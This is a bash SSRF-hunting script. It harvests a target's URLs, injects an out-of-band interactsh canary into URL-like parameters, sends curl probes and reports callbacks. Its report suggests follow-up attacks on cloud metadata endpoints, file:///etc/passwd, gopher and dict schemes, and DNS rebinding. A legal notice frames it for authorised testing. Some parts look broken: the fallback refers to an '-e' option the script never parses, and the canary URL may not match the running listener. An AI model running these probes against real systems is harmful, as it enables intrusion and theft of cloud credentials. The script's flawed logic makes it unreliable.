#!/usr/bin/env bash
# ssrf_finder.sh — SSRF candidate finder using out-of-band (OOB) verification.
#
# How it works:
#   1) Collect URLs (gau) → keep ones whose params look URL-ish
#      (url, redirect, callback, fetch, image, proxy, dest, ...)
#   2) Generate a unique interactsh URL (or webhook.site fallback)
#   3) Substitute that URL into each param
#   4) Wait, then poll interactsh for hits
#   5) Hits → strong SSRF candidate
#
# Why OOB: many SSRFs return no useful response body. They DO talk back
# to attacker-controlled infrastructure. That's the high-signal indicator.
#
# Required: curl, jq
# Strongly recommended: interactsh-client (ProjectDiscovery)
#   GO111MODULE=on go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
#
# Usage:
#   ./ssrf_finder.sh https://target.lab
#   ./ssrf_finder.sh -l urls.txt --wait 60 --yes

set -uo pipefail

LEGAL='
================ LEGAL NOTICE ================
SSRF probing causes the target server to make outbound requests to
infrastructure you control. Use only on:
  (a) your own systems,
  (b) authorised targets,
  (c) self-hosted lab apps.
==============================================
'

TARGET=""; URLLIST=""; OUT=""; WAIT_S=45; YES=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    -l|--list)  URLLIST="$2"; shift 2 ;;
    -o|--out)   OUT="$2"; shift 2 ;;
    --wait)     WAIT_S="$2"; shift 2 ;;
    --yes)      YES=1; shift ;;
    -h|--help)  sed -n '2,20p' "$0"; exit 0 ;;
    *)          TARGET="$1"; shift ;;
  esac
done

[[ -z "$TARGET" && -z "$URLLIST" ]] && { echo "Usage: $0 <target-url> | -l urls.txt"; exit 2; }
echo "$LEGAL"
[[ $YES -ne 1 ]] && { read -rp "Proceed? (yes/N) " a; [[ "$a" != yes ]] && exit 1; }

OUT="${OUT:-./ssrf_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"
URLS="$OUT/urls.txt"
TARGETED="$OUT/url_params.txt"
HITS_FILE="$OUT/oob_hits.json"
REPORT="$OUT/report.md"

have(){ command -v "$1" >/dev/null 2>&1; }

# Param names that frequently host SSRF
URL_PARAMS='url|uri|link|src|dest|destination|redirect|redir|next|target|fetch|callback|cb|return|continue|returnto|file|path|page|image|img|proxy|view|host|domain|server|api'

# ---- 1. Collect URLs --------------------------------------------------
if [[ -n "$URLLIST" ]]; then
  cp "$URLLIST" "$URLS"
elif have gau; then
  echo "[*] gau on $TARGET ..."
  echo "$TARGET" | gau --threads 5 2>/dev/null | sort -u > "$URLS"
else
  echo "$TARGET" > "$URLS"
fi
NURL=$(wc -l < "$URLS")
echo "    -> $NURL URLs"

# ---- 2. Filter to URL-ish params --------------------------------------
grep -iE "[?&](${URL_PARAMS})=" "$URLS" | sort -u > "$TARGETED"
NPARAM=$(wc -l < "$TARGETED")
echo "    -> $NPARAM URLs with URL-ish params"

if (( NPARAM == 0 )); then
  echo "    !! no URL-ish params found; nothing to probe"
  exit 0
fi

# ---- 3. Set up OOB listener (interactsh or fallback) ------------------
INTERACT_URL=""
INTERACT_PID=""

if have interactsh-client; then
  echo "[*] Starting interactsh-client (oob listener) ..."
  # Run in background, write hits to file as JSON
  interactsh-client -json -o "$HITS_FILE" -v >/dev/null 2>&1 &
  INTERACT_PID=$!
  sleep 3
  # interactsh-client logs the URL on stdout; we have to scrape it differently
  # Workaround: inspect ~/.config/interactsh-client or use -url-only mode
  INTERACT_URL=$(interactsh-client -url-only 2>/dev/null | head -1)
  if [[ -z "$INTERACT_URL" ]]; then
    # Older versions: parse from output of a quick run
    timeout 5 interactsh-client 2>&1 | grep -oE '[a-z0-9]+\.oast\.[a-z]+' | head -1 > "$OUT/_iurl"
    INTERACT_URL=$(cat "$OUT/_iurl")
  fi
  echo "    Listener: $INTERACT_URL"
else
  cat <<'EOF'
    !! interactsh-client not installed.

    Manual fallback:
       1. Open https://app.interactsh.com (or webhook.site)
       2. Copy the unique URL it gives you
       3. Re-run this script with: -e <your-oob-url>
       4. After scan, check the listener UI for hits

    Or install:
       go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
EOF
  exit 1
fi

cleanup(){ [[ -n "$INTERACT_PID" ]] && kill "$INTERACT_PID" 2>/dev/null; }
trap cleanup EXIT

# ---- 4. Inject canary URL into each candidate -------------------------
echo "[*] Injecting canary into $NPARAM URLs ..."
> "$OUT/probed.txt"
while read -r u; do
  # Build mutated URL: replace the value of the matching param with our oob URL
  mutated=$(echo "$u" | sed -E "s#([?&](${URL_PARAMS})=)[^&]*#\1http://${INTERACT_URL}/canary#i")
  curl -sk --max-time 10 -A "ssrf-finder" -o /dev/null "$mutated" 2>/dev/null &
  echo "$mutated" >> "$OUT/probed.txt"
  # Cap concurrency
  if (( $(jobs -r | wc -l) >= 10 )); then wait -n; fi
done < "$TARGETED"
wait
echo "    -> probes sent"

# ---- 5. Wait for callbacks --------------------------------------------
echo "[*] Waiting ${WAIT_S}s for OOB callbacks ..."
sleep "$WAIT_S"

# ---- 6. Parse hits ----------------------------------------------------
NHIT=0
if [[ -s "$HITS_FILE" ]]; then
  NHIT=$(grep -c "" "$HITS_FILE" 2>/dev/null || echo 0)
fi
echo "    -> $NHIT OOB callbacks received"

# ---- 7. Report --------------------------------------------------------
{
  echo "# SSRF Finder Report"
  echo
  echo "_Generated: $(date -u '+%Y-%m-%dT%H:%M:%SZ')_"
  echo
  echo "## Summary"
  echo
  echo "| Metric | Count |"
  echo "|--------|-------|"
  echo "| URLs scanned | $NURL |"
  echo "| URL-ish params probed | $NPARAM |"
  echo "| OOB callbacks received | $NHIT |"
  echo
  echo "_Listener: \`$INTERACT_URL\`_"
  echo
  echo "## OOB Hits"
  echo
  if (( NHIT > 0 )); then
    echo '| Time | Source IP | Protocol | Full request |'
    echo '|------|-----------|----------|--------------|'
    jq -r '"| \(.timestamp) | \(.\"remote-address\") | \(.protocol) | `\(.\"raw-request\" // .url // "?" | tostring | .[0:200])` |"' \
      "$HITS_FILE" 2>/dev/null
  else
    echo "_(no callbacks)_"
    echo
    echo "Reasons callbacks may not arrive even with SSRF present:"
    echo "- Egress firewall on target blocking outbound to your listener"
    echo "- SSRF only reaches internal network (need internal-IP wordlist instead)"
    echo "- SSRF requires non-default protocol (\`gopher://\`, \`file://\`, \`dict://\`)"
    echo "- Param needs URL-encoded value or specific scheme"
    echo "- Wait time too short — try \`--wait 120\`"
  fi
  echo
  echo "## Validation steps for hits"
  echo
  echo "1. **Match callback time to the probed URL** in \`probed.txt\` to identify which param triggered."
  echo "2. **Test internal targets** (cloud metadata, internal services):"
  echo "   - AWS: \`http://169.254.169.254/latest/meta-data/\` (use IMDSv1 only — IMDSv2 needs token)"
  echo "   - GCP: \`http://metadata.google.internal/computeMetadata/v1/\` (needs \`Metadata-Flavor: Google\`)"
  echo "   - Azure: \`http://169.254.169.254/metadata/instance?api-version=2021-02-01\` (needs \`Metadata: true\`)"
  echo "3. **Try alternative schemes**: \`file:///etc/passwd\`, \`gopher://\`, \`dict://localhost:11211/\`."
  echo "4. **DNS rebinding** if direct internal access blocked: register a domain that resolves to public first then RFC1918."
  echo
  echo "---"
  echo
  echo "_OOB callback ≠ vulnerability that pays. Report only after demonstrating concrete impact (cloud creds, internal data, etc.)._"
} > "$REPORT"

echo
echo "[+] Done."
echo "    Report: $REPORT"
echo "    Hits  : $NHIT"
